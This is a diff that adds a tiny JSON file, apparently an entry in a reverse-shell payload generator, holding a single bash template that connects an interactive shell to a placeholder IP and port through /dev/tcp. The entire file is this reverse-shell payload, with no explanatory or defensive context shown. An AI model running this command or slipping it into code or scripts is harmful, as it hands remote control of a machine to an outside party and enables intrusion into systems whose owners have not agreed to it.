@@ -1,0 +1,6 @@
+[
+  {
+    "lang": ["bash", "sh"],
+    "code": "bash -i >& /dev/tcp/{d[ip]}/{d[port]} 0>&1"
+  }
+]
